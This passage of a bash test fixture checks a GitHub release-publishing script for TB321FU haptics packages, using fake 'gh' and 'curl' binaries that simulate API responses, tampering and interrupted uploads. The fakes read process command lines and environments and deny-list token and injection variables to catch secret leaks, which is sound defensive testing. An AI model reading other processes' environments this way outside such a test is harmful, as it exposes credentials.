#!/bin/bash -p
if ! [[ -o privileged ]]; then
  builtin exit 126
fi
set -euo pipefail

: "${TMPDIR:?publication fixture requires runner-owned TMPDIR}"
case $TMPDIR in
  /*) ;;
  *) printf 'publication fixture TMPDIR must be absolute\n' >&2; exit 2 ;;
esac
if [[ ! -d $TMPDIR || -L $TMPDIR ]]; then
  printf 'publication fixture TMPDIR differs from policy\n' >&2
  exit 2
fi

ROOT=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/../.." && pwd -P)
PUBLISH=$ROOT/scripts/ci/publish-release.sh
PUBLISH_DRAFT_BY_ID=$ROOT/scripts/ci/publish-draft-release-by-id.sh
WORKFLOW=$ROOT/.github/workflows/build.yml
scratch=
scratch_owned=false
pending_allocation_signal=
cleanup() {
  if $scratch_owned; then
    case $scratch in
      "$TMPDIR"/tb321fu-haptics-publication-fixture.*)
        rm -rf -- "$scratch"
        ;;
    esac
  fi
}
cancel_int() {
  trap - INT TERM EXIT
  cleanup
  exit 130
}
cancel_term() {
  trap - INT TERM EXIT
  cleanup
  exit 143
}
record_allocation_int() {
  if $scratch_owned; then
    cancel_int
  fi
  pending_allocation_signal=INT
}
record_allocation_term() {
  if $scratch_owned; then
    cancel_term
  fi
  pending_allocation_signal=TERM
}
trap cleanup EXIT
trap record_allocation_int INT
trap record_allocation_term TERM
scratch=$TMPDIR/tb321fu-haptics-publication-fixture.$$.${RANDOM}.${RANDOM}
/usr/bin/mkdir -m 0700 -- "$scratch"
scratch_owned=true
case $pending_allocation_signal in
  INT) cancel_int ;;
  TERM) cancel_term ;;
esac

fakebin=$scratch/fakebin
mkdir -p "$fakebin"
cat > "$fakebin/sleep" <<'SH'
#!/bin/sh
exit 0
SH
cat > "$fakebin/curl" <<'SH'
#!/usr/bin/env bash
set -euo pipefail
: "${GH_STATE:?}"
: "${AUTH_SENTINEL_FILE:?}"
mkdir -p "$GH_STATE"

release_token=$(cat "$AUTH_SENTINEL_FILE")
process_cmdline=$(tr '\0' '\n' < "/proc/$$/cmdline")
process_environ=$(tr '\0' '\n' < "/proc/$$/environ")
case $process_cmdline in
  *"$release_token"*)
    printf 'release token leaked through curl argv\n' >&2
    exit 2
    ;;
esac
case $process_environ in
  *"$release_token"*)
    printf 'release token leaked through curl environment\n' >&2
    exit 2
    ;;
esac
while IFS= read -r environment_entry; do
  case $environment_entry in
    GH_TOKEN=*|GITHUB_TOKEN=*|HOME=*|CURL_HOME=*|BASH_ENV=*|ENV=*|PYTHONHOME=*|PYTHONPATH=*|BASH_FUNC_*=*)
      printf 'sensitive publisher variable leaked through curl environment: %s\n' \
        "${environment_entry%%=*}" >&2
      exit 2
      ;;
  esac
done <<< "$process_environ"
printf 'process-auth-clean\n' >> "$GH_STATE/curl-process-inspection.log"

printf '%q ' "$@" >> "$GH_STATE/curl-calls.log"
printf '\n' >> "$GH_STATE/curl-calls.log"
[ "${1:-}" = --disable ] || {
  printf 'curl config loading was not disabled by the first argument\n' >&2
  exit 2
}
shift

method=
data=
url=
accept=false
authorization=false
api_version=false
content_type=false
connect_timeout=
max_time=
while [ "$#" -gt 0 ]; do
  case $1 in
    --fail-with-body|--silent|--show-error) shift ;;
    --request) method=$2; shift 2 ;;
    --connect-timeout) connect_timeout=$2; shift 2 ;;
    --max-time) max_time=$2; shift 2 ;;
    --header)
      case $2 in
        'Accept: application/vnd.github+json') accept=true ;;
        @-)
          IFS= read -r auth_header
          [ "$auth_header" = "Authorization: Bearer $release_token" ]
          if IFS= read -r extra_auth_line; then
            printf 'curl received more than one authentication header line\n' >&2
            exit 2
          fi
          printf 'stdin-authenticated\n' >> "$GH_STATE/curl-stdin-auth.log"
          authorization=true
          ;;
        'X-GitHub-Api-Version: 2022-11-28') api_version=true ;;
        'Content-Type: application/octet-stream') content_type=true ;;
        *) printf 'unexpected curl header: %s\n' "$2" >&2; exit 2 ;;
      esac
      shift 2
      ;;
    --data-binary) data=$2; shift 2 ;;
    https://*) [ -z "$url" ]; url=$1; shift ;;
    *) printf 'unexpected curl argument: %s\n' "$1" >&2; exit 2 ;;
  esac
done
[ "$method" = POST ]
$accept
$authorization
$api_version
$content_type
[ "$connect_timeout" = 15 ]
[ "$max_time" = 300 ]
[ -f "$GH_STATE/exists" ]
[ "$(cat "$GH_STATE/draft")" = true ]
[ "$(cat "$GH_STATE/id")" = 101 ]
prefix=https://uploads.github.com/repos/GUF296/tb321fu-haptics-debs/releases/101/assets?name=
case $url in
  "$prefix"*) name=${url#"$prefix"} ;;
  *) printf 'unexpected upload URL: %s\n' "$url" >&2; exit 2 ;;
esac
[[ $name =~ ^[A-Za-z0-9][A-Za-z0-9._-]*$ ]]
[[ $data == @* ]]
file=${data#@}
[ -f "$file" ]
printf 'upload-start %s\n' "$name" >> "$GH_STATE/events.log"
[ "${GH_FAIL_UPLOAD:-0}" != 1 ] || exit 73
if awk -F '\t' -v name="$name" '$1 == name { found = 1 } END { exit found ? 0 : 1 }' "$GH_STATE/assets.tsv"; then
  printf 'duplicate upload asset: %s\n' "$name" >&2
  exit 67
fi
size=$(stat -c '%s' "$file")
digest=sha256:$(sha256sum "$file" | awk '{print $1}')
if [ "${GH_CORRUPT_DIGEST:-0}" = 1 ]; then
  digest=sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
fi
printf '%s\t%s\t%s\n' "$name" "$size" "$digest" >> "$GH_STATE/assets.tsv"
printf 'upload-complete %s\n' "$name" >> "$GH_STATE/events.log"
case ${GH_APPLY_THEN_SIGNAL_UPLOAD:-} in
  '') ;;
  INT|TERM)
    : "${TB321FU_PUBLICATION_PARENT_PID:?}"
    printf 'upload-applied-signal-%s %s\n' \
      "$GH_APPLY_THEN_SIGNAL_UPLOAD" "$name" >> "$GH_STATE/events.log"
    : > "$GH_STATE/upload-signal-sent"
    kill -s "$GH_APPLY_THEN_SIGNAL_UPLOAD" \
      "$TB321FU_PUBLICATION_PARENT_PID"
    /usr/bin/sleep 0.1
    : > "$GH_STATE/upload-write-child-finished"
    ;;
  *) printf 'invalid applied-upload signal fixture\n' >&2; exit 2 ;;
esac
[ "${GH_APPLY_THEN_FAIL_UPLOAD:-0}" != 1 ] || exit 76
SH

cat > "$fakebin/gh" <<'SH'
#!/usr/bin/env bash
set -euo pipefail
: "${GH_STATE:?}"
: "${AUTH_SENTINEL_FILE:?}"
: "${GH_TOKEN:?}"
: "${EXPECTED_PRODUCER_SHA:?}"
[ "$GH_TOKEN" = "$(cat "$AUTH_SENTINEL_FILE")" ]
[[ $EXPECTED_PRODUCER_SHA =~ ^[0-9a-f]{40}$ ]]
[ "${GH_PROMPT_DISABLED:-}" = 1 ]
[ -z "${GH_HOST+x}" ]
[ -z "${GITHUB_TOKEN+x}" ]
[ -z "${GH_ENTERPRISE_TOKEN+x}" ]
[ -z "${GITHUB_ENTERPRISE_TOKEN+x}" ]
[ -z "${GH_DEBUG+x}" ]
process_cmdline=$(tr '\0' '\n' < "/proc/$$/cmdline")
parent_environ=$(tr '\0' '\n' < "/proc/$PPID/environ")
case $process_cmdline in
  *"$GH_TOKEN"*) printf 'release token leaked through gh argv\n' >&2; exit 2 ;;
esac
case $parent_environ in
  *"$GH_TOKEN"*) printf 'release token leaked to the timeout parent environment\n' >&2; exit 2 ;;
esac
for forbidden_name in BASH_ENV ENV PYTHONHOME PYTHONPATH; do
  eval "forbidden_is_set=\${$forbidden_name+x}"
  [ -z "$forbidden_is_set" ] || {
    printf 'hostile environment leaked to gh: %s\n' "$forbidden_name" >&2
    exit 2
  }
done
if tr '\0' '\n' < "/proc/$$/environ" | grep -q '^BASH_FUNC_'; then
  printf 'exported Bash function leaked to gh\n' >&2
  exit 2
fi
mkdir -p "$GH_STATE"
printf '%q ' "$@" >> "$GH_STATE/calls.log"
printf '\n' >> "$GH_STATE/calls.log"


if [ "${1:-}" = api ]; then
  shift
  method=GET
  if [ "${1:-}" = -X ]; then
    method=$2
    shift 2
  fi
  endpoint=$1
  shift
  query=
  paginate=false
  hostname=
  fields=()
  field_modes=()
  while [ "$#" -gt 0 ]; do
    case $1 in
      --paginate) paginate=true; shift ;;
      --jq) query=$2; shift 2 ;;
      --hostname) hostname=$2; shift 2 ;;
      -f|-F)
        field_modes+=("$1")
        fields+=("$2")
        shift 2
        ;;
      *) printf 'unexpected api argument: %s\n' "$1" >&2; exit 2 ;;
    esac
  done
  [ "$hostname" = github.com ]
  if [ "$method" = POST ]; then
    case $endpoint in
      repos/GUF296/tb321fu-haptics-debs/releases)
        [ "${GH_FAIL_RELEASE_CREATE:-0}" != 1 ] || exit 72
        [ ! -f "$GH_STATE/tag-exists" ]
        [ ! -f "$GH_STATE/exists" ] || exit 66
        tag=
        target=
        name=
        body=
        draft=
        prerelease=
        [ "${field_modes[*]}" = '-f -f -f -F -F -F' ]
        for field in "${fields[@]}"; do
          key=${field%%=*}
          value=${field#*=}
          case $key in
            tag_name) tag=$value ;;
            target_commitish) target=$value ;;
            name) name=$value ;;
            body) body=$value ;;
            draft) draft=$value ;;
            prerelease) prerelease=$value ;;
            *) printf 'unexpected release POST field: %s\n' "$key" >&2; exit 2 ;;
          esac
        done
        [ "$tag" = tb321fu-haptics-debs-20260730.2 ]
        [[ $target =~ ^[0-9a-f]{40}$ ]]
        [ "$target" = "$EXPECTED_PRODUCER_SHA" ]
        [ "$name" = "$tag" ]
        [[ $body == @* ]]
        [ -f "${body#@}" ]
        [ "$draft" = true ]
        [ "$prerelease" = true ]
        tag_target=${GH_CREATE_TAG_TARGET:-$target}
        : > "$GH_STATE/tag-exists"
        if [ "${GH_ANNOTATED_TAG:-0}" = 1 ]; then
          printf 'tag\n' > "$GH_STATE/tag-type"
          printf 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n' > "$GH_STATE/tag-object"
          printf 'commit\n' > "$GH_STATE/peeled-type"
          printf '%s\n' "$tag_target" > "$GH_STATE/peeled-object"
        else
          printf 'commit\n' > "$GH_STATE/tag-type"
          printf '%s\n' "$tag_target" > "$GH_STATE/tag-object"
        fi
        reported_tag=${GH_RELEASE_TAG_RESPONSE:-$tag}
        reported_target=${GH_RELEASE_TARGET_RESPONSE:-$target}
        reported_name=${GH_RELEASE_NAME_RESPONSE:-$name}
        body_b64=$(base64 -w 0 < "${body#@}")
        reported_body_b64=${GH_RELEASE_BODY_B64_RESPONSE:-$body_b64}
        : > "$GH_STATE/exists"
        printf '%s\n' "$reported_tag" > "$GH_STATE/tag"
        printf '%s\n' "$reported_target" > "$GH_STATE/target"
        printf '%s\n' "$reported_name" > "$GH_STATE/name"
        printf '%s\n' "$reported_body_b64" > "$GH_STATE/body-b64"
        printf 'true\n' > "$GH_STATE/draft"
        printf 'true\n' > "$GH_STATE/prerelease"
        printf '101\n' > "$GH_STATE/id"
        : > "$GH_STATE/assets.tsv"
        printf 'create-draft\n' >> "$GH_STATE/events.log"
        [ "$query" = '[.id, .tag_name, (.draft | tostring), (.immutable | tostring), .target_commitish, (.prerelease | tostring), .name, ((.body // "") | @base64)] | @tsv' ]
        printf 'false\n' > "$GH_STATE/immutable"
        case ${GH_APPLY_THEN_SIGNAL_RELEASE_CREATE:-} in
          '') ;;
          INT|TERM)
            : "${TB321FU_PUBLICATION_PARENT_PID:?}"
            printf 'create-applied-signal-%s\n' \
              "$GH_APPLY_THEN_SIGNAL_RELEASE_CREATE" >> "$GH_STATE/events.log"
            : > "$GH_STATE/create-signal-sent"
            kill -s "$GH_APPLY_THEN_SIGNAL_RELEASE_CREATE" \
              "$TB321FU_PUBLICATION_PARENT_PID"
            /usr/bin/sleep 0.1
            : > "$GH_STATE/create-write-child-finished"
            ;;
          *) printf 'invalid applied-create signal fixture\n' >&2; exit 2 ;;
        esac
        [ "${GH_APPLY_THEN_FAIL_RELEASE_CREATE:-0}" != 1 ] || exit 76
        printf '101\t%s\ttrue\tfalse\t%s\ttrue\t%s\t%s\n' \
          "$reported_tag" "$reported_target" "$reported_name" "$reported_body_b64"
        ;;
      *) printf 'unexpected POST endpoint: %s\n' "$endpoint" >&2; exit 2 ;;
    esac
    exit
  fi
  if [ "$method" = PATCH ]; then
    [ "${FAKE_NUMERIC_PUBLISHER:-}" = 1 ] || {
      printf 'publisher attempted unsupported release PATCH\n' >&2
      exit 2
    }
    [ "$endpoint" = repos/GUF296/tb321fu-haptics-debs/releases/101 ] || exit 45
    [ -f "$GH_STATE/exists" ]
    [ "$(cat "$GH_STATE/id")" = 101 ]
    [ "$(cat "$GH_STATE/draft")" = true ]
    [ "${GH_FAIL_PATCH:-0}" != 1 ] || exit 74
    draft=
    prerelease=
    make_latest=
    : > "$GH_STATE/patch-fields.log"
    [ "${field_modes[*]}" = '-F -F -f' ]
    for field in "${fields[@]}"; do
      key=${field%%=*}
      value=${field#*=}
      printf '%s\t%s\n' "$key" "$value" >> "$GH_STATE/patch-fields.log"
      case $key in
        draft) draft=$value ;;
        prerelease) prerelease=$value ;;
        make_latest) make_latest=$value ;;
        *) printf 'unexpected release PATCH field: %s\n' "$key" >&2; exit 2 ;;
      esac
    done
    [ "${#fields[@]}" -eq 3 ]
    [ "$draft" = false ]
    [ "$prerelease" = true ]
    [ "$make_latest" = false ]
    [ "$query" = '(["release", (.id | tostring), (.draft | tostring), (.immutable | tostring), .tag_name, .target_commitish, (.prerelease | tostring), .name, ((.body // "") | @base64)], (.assets | sort_by(.name)[] | ["asset", .name, (.size | tostring), (.digest // ""), .state])) | @tsv' ] || exit 2
    printf 'false\n' > "$GH_STATE/draft"
    printf 'true\n' > "$GH_STATE/immutable"
    printf 'true\n' > "$GH_STATE/prerelease"
    : > "$GH_STATE/published"
    printf 'publish-draft\n' >> "$GH_STATE/events.log"
    if [ "${GH_RETARGET_TAG_AFTER_PATCH:-0}" = 1 ]; then
      printf 'ffffffffffffffffffffffffffffffffffffffff\n' > "$GH_STATE/tag-object"
    fi
    case ${GH_MUTATE_RELEASE_AFTER_PATCH:-none} in
      none) ;;
      tag) printf 'other-tag\n' > "$GH_STATE/tag" ;;
      target) printf 'ffffffffffffffffffffffffffffffffffffffff\n' > "$GH_STATE/target" ;;
      prerelease) printf 'false\n' > "$GH_STATE/prerelease" ;;
      immutable) printf 'false\n' > "$GH_STATE/immutable" ;;
      name) printf 'other-title\n' > "$GH_STATE/name" ;;
      body) printf 'b3RoZXItYm9keQ==\n' > "$GH_STATE/body-b64" ;;
      digest)
        awk -F '\t' 'BEGIN { OFS="\t" } NR == 1 { $3="sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb" } { print }' \
          "$GH_STATE/assets.tsv" > "$GH_STATE/assets.tsv.new"
        mv "$GH_STATE/assets.tsv.new" "$GH_STATE/assets.tsv"
        ;;
      extra)
        printf 'intruder.bin\t1\tsha256:cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc\n' \
          >> "$GH_STATE/assets.tsv"
        ;;
      *) printf 'unknown post-PATCH release mutation\n' >&2; exit 2 ;;
    esac
    case ${GH_APPLY_THEN_SIGNAL_PATCH:-} in
      '') ;;
      INT|TERM)
        : "${TB321FU_PUBLICATION_PARENT_PID:?}"
        printf 'patch-applied-signal-%s\n' \
          "$GH_APPLY_THEN_SIGNAL_PATCH" >> "$GH_STATE/events.log"
        : > "$GH_STATE/patch-signal-sent"
        kill -s "$GH_APPLY_THEN_SIGNAL_PATCH" \
          "$TB321FU_PUBLICATION_PARENT_PID"
        /usr/bin/sleep 0.1
        : > "$GH_STATE/patch-write-child-finished"
        ;;
      *) printf 'invalid applied-PATCH signal fixture\n' >&2; exit 2 ;;
    esac
    [ "${GH_APPLY_THEN_FAIL_PATCH:-0}" != 1 ] || exit 75
    if [ "${GH_PATCH_BAD_RESPONSE:-0}" = 1 ]; then
      printf 'malformed patch response\n'
      exit
    fi
    patch_draft=$(cat "$GH_STATE/draft")
    patch_immutable=$(cat "$GH_STATE/immutable")
    if [ "${GH_PATCH_STALE_RESPONSE:-0}" = 1 ]; then
      patch_draft=true
      patch_immutable=false
    fi
    printf 'release\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
      "$(cat "$GH_STATE/id")" "$patch_draft" \
      "$patch_immutable" "$(cat "$GH_STATE/tag")" \
      "$(cat "$GH_STATE/target")" "$(cat "$GH_STATE/prerelease")" \
      "$(cat "$GH_STATE/name")" "$(cat "$GH_STATE/body-b64")"
    awk -F '\t' 'BEGIN { OFS="\t" } { print "asset", $1, $2, $3, "uploaded" }' \
      "$GH_STATE/assets.tsv"
    exit
  fi

  [ "$method" = GET ] || {
    printf 'unexpected read method: %s\n' "$method" >&2
    exit 2
  }
  [ "${#fields[@]}" -eq 0 ]
  for write_phase in create upload patch; do
    if [ -f "$GH_STATE/$write_phase-signal-sent" ] &&
       [ ! -f "$GH_STATE/$write_phase-write-child-finished" ]; then
      printf '%s\n' "$write_phase" >> \
        "$GH_STATE/reconcile-before-write-child-finished.log"
    fi
  done

  case "$endpoint" in
    'repos/GUF296/tb321fu-haptics-debs/releases?per_page=100')
      [ "${GH_FAIL_RELEASE_LIST:-0}" != 1 ] || exit 70
      [ "$paginate" = true ] || exit 69
      case $query in
        '.[].tag_name')
          [ ! -f "$GH_STATE/exists" ] || cat "$GH_STATE/tag"
          ;;
        '.[] | select(.tag_name == "tb321fu-haptics-debs-20260730.2") | (["release", (.id | tostring), (.draft | tostring), (.immutable | tostring), .tag_name, .target_commitish, (.prerelease | tostring), .name, ((.body // "") | @base64)], (.assets | sort_by(.name)[] | ["asset", .name, (.size | tostring), (.digest // ""), .state])) | @tsv')
          if [ -f "$GH_STATE/exists" ] &&
             [ "$(cat "$GH_STATE/tag")" = tb321fu-haptics-debs-20260730.2 ]; then
            printf 'release\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
              "$(cat "$GH_STATE/id")" "$(cat "$GH_STATE/draft")" \
              "$(cat "$GH_STATE/immutable")" "$(cat "$GH_STATE/tag")" \
              "$(cat "$GH_STATE/target")" "$(cat "$GH_STATE/prerelease")" \
              "$(cat "$GH_STATE/name")" "$(cat "$GH_STATE/body-b64")"
            awk -F '\t' 'BEGIN { OFS="\t" } { print "asset", $1, $2, $3, "uploaded" }' \
              "$GH_STATE/assets.tsv"
            if [ "${GH_DUPLICATE_TAG_MATCH:-0}" = 1 ]; then
              printf 'release\t202\ttrue\tfalse\t%s\t%s\ttrue\t%s\t%s\n' \
                "$(cat "$GH_STATE/tag")" "$(cat "$GH_STATE/target")" \
                "$(cat "$GH_STATE/name")" "$(cat "$GH_STATE/body-b64")"
            fi
          fi
          ;;
        '.[] | select(.draft == false and .prerelease == false) | .id')
          [ "${GH_NO_LATEST:-0}" = 1 ] || printf '77\n'
          ;;
        *) printf 'unexpected release-list query: %s\n' "$query" >&2; exit 2 ;;
      esac
      exit
      ;;
    repos/GUF296/tb321fu-haptics-debs/immutable-releases)
      [ "$paginate" = false ]
      [ "$query" = '[(.enabled | tostring), (.enforced_by_owner | tostring)] | @tsv' ]
      [ "${GH_IMMUTABLE_DISABLED:-0}" = 1 ] && printf 'false\tfalse\n' || printf 'true\tfalse\n'
      exit
      ;;
    repos/GUF296/tb321fu-haptics-debs/git/matching-refs/tags/tb321fu-haptics-debs-20260730.2)
      [ "${GH_FAIL_REF_LIST:-0}" != 1 ] || exit 71
      [ "$query" = '.[].ref' ]
      [ ! -f "$GH_STATE/tag-exists" ] || printf 'refs/tags/%s\n' tb321fu-haptics-debs-20260730.2
      exit
      ;;
    repos/GUF296/tb321fu-haptics-debs/git/ref/tags/tb321fu-haptics-debs-20260730.2)
      [ -f "$GH_STATE/tag-exists" ] || exit 1
      [ "$query" = '[.object.type, .object.sha] | @tsv' ]
      printf '%s\t%s\n' "$(cat "$GH_STATE/tag-type")" "$(cat "$GH_STATE/tag-object")"
      exit
      ;;
    repos/GUF296/tb321fu-haptics-debs/git/tags/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa)
      [ -f "$GH_STATE/peeled-type" ] || exit 1
      [ "$query" = '[.object.type, .object.sha] | @tsv' ]
      printf '%s\t%s\n' "$(cat "$GH_STATE/peeled-type")" "$(cat "$GH_STATE/peeled-object")"
      exit
      ;;
    repos/GUF296/tb321fu-haptics-debs/releases/tags/tb321fu-haptics-debs-20260730.2)
      [ -f "$GH_STATE/exists" ] || exit 44
      [ "$(cat "$GH_STATE/draft")" != true ] || exit 44
      ;;
    repos/GUF296/tb321fu-haptics-debs/releases/latest)
      [ "${GH_NO_LATEST:-0}" != 1 ] || exit 44
      [ "$query" = '(["latest", (.id | tostring), (.draft | tostring), (.immutable | tostring), .tag_name, .target_commitish, (.prerelease | tostring), .name, ((.body // "") | @base64)], (.assets | sort_by(.name)[] | ["latest-asset", .name, (.size | tostring), (.digest // ""), .state])) | @tsv' ] || exit 2
      latest_count=0
      [ ! -f "$GH_STATE/latest-count" ] || latest_count=$(cat "$GH_STATE/latest-count")
      latest_count=$((latest_count + 1))
      printf '%s\n' "$latest_count" > "$GH_STATE/latest-count"
      if { [ "${GH_CHANGE_LATEST_BEFORE_PATCH:-0}" = 1 ] && [ "$latest_count" -ge 2 ]; } ||
         { [ "${GH_CHANGE_LATEST_AFTER_PATCH:-0}" = 1 ] && [ -f "$GH_STATE/published" ]; }; then
        printf 'latest\t78\tfalse\ttrue\tstable/other\tmain\tfalse\t\tc3RhYmxlLW90aGVyCg==\n'
      else
        printf 'latest\t77\tfalse\ttrue\tstable/20260627\tmain\tfalse\t\tc3RhYmxlCg==\n'
        printf 'latest-asset\tstable.bin\t7\tsha256:dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd\tuploaded\n'
      fi
      exit
      ;;
  esac

  if [[ $query == *'["release"'* ]]; then
    [ "$endpoint" = repos/GUF296/tb321fu-haptics-debs/releases/101 ] || exit 45
    [ "$query" = '(["release", (.id | tostring), (.draft | tostring), (.immutable | tostring), .tag_name, .target_commitish, (.prerelease | tostring), .name, ((.body // "") | @base64)], (.assets | sort_by(.name)[] | ["asset", .name, (.size | tostring), (.digest // ""), .state])) | @tsv' ] || exit 2
    count=0
    [ ! -f "$GH_STATE/snapshot-count" ] || count=$(cat "$GH_STATE/snapshot-count")
    count=$((count + 1))
    printf '%s\n' "$count" > "$GH_STATE/snapshot-count"
    id=$(cat "$GH_STATE/id")
    draft=$(cat "$GH_STATE/draft")
    immutable=$(cat "$GH_STATE/immutable")
    tag=$(cat "$GH_STATE/tag")
    target=$(cat "$GH_STATE/target")
    prerelease=$(cat "$GH_STATE/prerelease")
    name=$(cat "$GH_STATE/name")
    body_b64=$(cat "$GH_STATE/body-b64")
    mutate=false
    if [ "${GH_MUTATE_SNAPSHOT:-0}" -eq "$count" ]; then mutate=true; fi
    numeric_count=0
    if [ "${FAKE_NUMERIC_PUBLISHER:-}" = 1 ]; then
      [ ! -f "$GH_STATE/numeric-snapshot-count" ] || numeric_count=$(cat "$GH_STATE/numeric-snapshot-count")
      numeric_count=$((numeric_count + 1))
      printf '%s\n' "$numeric_count" > "$GH_STATE/numeric-snapshot-count"
      if [ "$numeric_count" -eq 2 ] && [ -n "${GH_SIGNAL_BEFORE_PATCH:-}" ]; then
        case $GH_SIGNAL_BEFORE_PATCH in INT|TERM) ;;
          *) printf 'invalid pre-PATCH signal fixture\n' >&2; exit 2 ;;
        esac
        printf 'pre-patch-signal-%s\n' "$GH_SIGNAL_BEFORE_PATCH" >> "$GH_STATE/events.log"
        : "${TB321FU_PUBLICATION_PARENT_PID:?}"
        kill -s "$GH_SIGNAL_BEFORE_PATCH" "$TB321FU_PUBLICATION_PARENT_PID"
        /usr/bin/sleep 0.1
      fi
      if [ "${GH_CHANGE_DRAFT_BEFORE_PATCH:-0}" = 1 ] &&
         [ "$numeric_count" -eq 2 ] && [ "$draft" = true ]; then
        mutate=true
        GH_MUTATE_KIND=name
      fi
      if [ -f "$GH_STATE/published" ] &&
         [ "${GH_STALE_DRAFT_READS:-0}" -ge $((numeric_count - 2)) ] &&
         [ "$numeric_count" -ge 3 ]; then
        draft=true
        immutable=false
      fi
    fi
    if $mutate; then
      case ${GH_MUTATE_KIND:-target} in
        id) id=202 ;;
        draft) draft=false ;;
        immutable) immutable=true ;;
        tag) tag=other-tag ;;
        target) target=ffffffffffffffffffffffffffffffffffffffff ;;
        prerelease) prerelease=false ;;
        name) name=other-title ;;
        body) body_b64=b3RoZXItYm9keQ== ;;
        extra) : ;;
        digest) : ;;
        *) printf 'unknown mutation kind\n' >&2; exit 2 ;;
      esac
      printf 'external-mutation-%s\n' "${GH_MUTATE_KIND:-target}" >> "$GH_STATE/events.log"
    fi
    printf 'release\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
      "$id" "$draft" "$immutable" "$tag" "$target" "$prerelease" "$name" "$body_b64"
    asset_state=uploaded
    if [ "${GH_BAD_ASSET_STATE_AFTER_PATCH:-0}" = 1 ] && [ -f "$GH_STATE/published" ]; then
      asset_state=starter
    fi
    if $mutate && [ "${GH_MUTATE_KIND:-}" = digest ]; then
      awk -F '\t' 'BEGIN { OFS="\t" } NR == 1 { $3="sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb" } { print }' \
        "$GH_STATE/assets.tsv" | awk -F '\t' -v state="$asset_state" \
          'BEGIN { OFS="\t" } { print "asset", $1, $2, $3, state }'
    else
      awk -F '\t' -v state="$asset_state" \
        'BEGIN { OFS="\t" } { print "asset", $1, $2, $3, state }' "$GH_STATE/assets.tsv"
    fi
    if $mutate && [ "${GH_MUTATE_KIND:-}" = extra ]; then
      printf 'asset\tintruder.bin\t1\tsha256:cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc\tuploaded\n'
    fi
    exit
  fi

  printf 'unexpected GET endpoint/query: %s (%s)\n' "$endpoint" "$query" >&2
  exit 2
fi

printf 'unexpected gh command: %s\n' "$*" >&2
exit 2
SH
chmod +x "$fakebin/gh" "$fakebin/sleep" "$fakebin/curl"

release_token="test-release-token-$RANDOM-$RANDOM-$$"
fallback_token="test-github-token-$RANDOM-$RANDOM-$$"
token_sentinel_file=$scratch/release-token-sentinel
printf '%s\n' "$release_token" > "$token_sentinel_file"

publisher_repo=$scratch/publisher-repo
mkdir -p "$publisher_repo"
git -C "$publisher_repo" init -q
git -C "$publisher_repo" config user.name fixture
git -C "$publisher_repo" config user.email fixture@example.invalid
printf 'reference base\n' > "$publisher_repo/BASE"
git -C "$publisher_repo" add BASE
git -C "$publisher_repo" commit -q -m base
reference_producer=$(git -C "$publisher_repo" rev-parse HEAD)

publisher_scripts=$publisher_repo/scripts/ci
mkdir -p "$publisher_scripts"
mkdir -p \
  "$publisher_repo/haptics/daily-current/linux/drivers/input/misc" \
  "$publisher_repo/haptics/rootfs-reference/usr/lib/firmware" \
  "$publisher_repo/haptics/baseline-20260614-daily-clean/testing-tools"
cat > "$publisher_repo/haptics/daily-current/linux/drivers/input/misc/aw86937-y700.c" <<'EOF'
/* Lenovo Y700 AW86937 input force-feedback haptics driver */
static struct { const char *name; } driver = {
	.name = "aw86937-y700",
};
static const char *ids[] = {
	{ "aw86937_y700" },
};
EOF
printf 'ram firmware\n' > \
  "$publisher_repo/haptics/rootfs-reference/usr/lib/firmware/haptic_ram.bin"
printf 'click firmware\n' > \
  "$publisher_repo/haptics/rootfs-reference/usr/lib/firmware/haptic_click.bin"
printf 'test helper\n' > \
  "$publisher_repo/haptics/baseline-20260614-daily-clean/testing-tools/y700-haptic-test.c"
cp -a -- \
  "$PUBLISH" \
  "$PUBLISH_DRAFT_BY_ID" \
  "$ROOT/scripts/ci/common.sh" \
  "$ROOT/scripts/ci/safe-extract-archive.py" \
  "$ROOT/scripts/ci/snapshot-bounded-regular-file.py" \
  "$ROOT/scripts/ci/snapshot-haptics-publication-stage.py" \
  "$ROOT/scripts/ci/verify-haptics-release-archive.sh" \
  "$ROOT/scripts/ci/verify-haptics-release-provenance.py" \
  "$ROOT/scripts/ci/verify-haptics-publication-stage.sh" \
  "$ROOT/scripts/ci/verify-haptics-release-reference.py" \
  "$publisher_scripts/"
sed -i \
  -e "s#gh_path=/usr/bin/gh#gh_path=$fakebin/gh#" \
  -e "s#curl_path=/usr/bin/curl#curl_path=$fakebin/curl#" \
  "$publisher_scripts/publish-release.sh"
sed -i \
  -e "s#gh_path=/usr/bin/gh#gh_path=$fakebin/gh#" \
  "$publisher_scripts/publish-draft-release-by-id.sh"

fixture_producer=$scratch/fixture-producer
mkdir -p \
  "$fixture_producer/HAPTICS-SOURCE-SNAPSHOT/source/haptics/daily-current/linux/drivers/input/misc" \
  "$fixture_producer/HAPTICS-SOURCE-SNAPSHOT/build" \
  "$fixture_producer/HAPTICS-SOURCE-SNAPSHOT/source/haptics/rootfs-reference/usr/lib/firmware" \
  "$fixture_producer/HAPTICS-SOURCE-SNAPSHOT/source/haptics/baseline-20260614-daily-clean/testing-tools"
fixture_deb=tb321fu-haptics_20260730.2_arm64.deb
printf 'synthetic trusted DEB\n' > "$fixture_producer/$fixture_deb"
fixture_deb_sha=$(sha256sum "$fixture_producer/$fixture_deb" | awk '{ print $1 }')
fixture_bundle=dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
fixture_module=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
fixture_helper=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
fixture_toolchain=cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
cp -- \
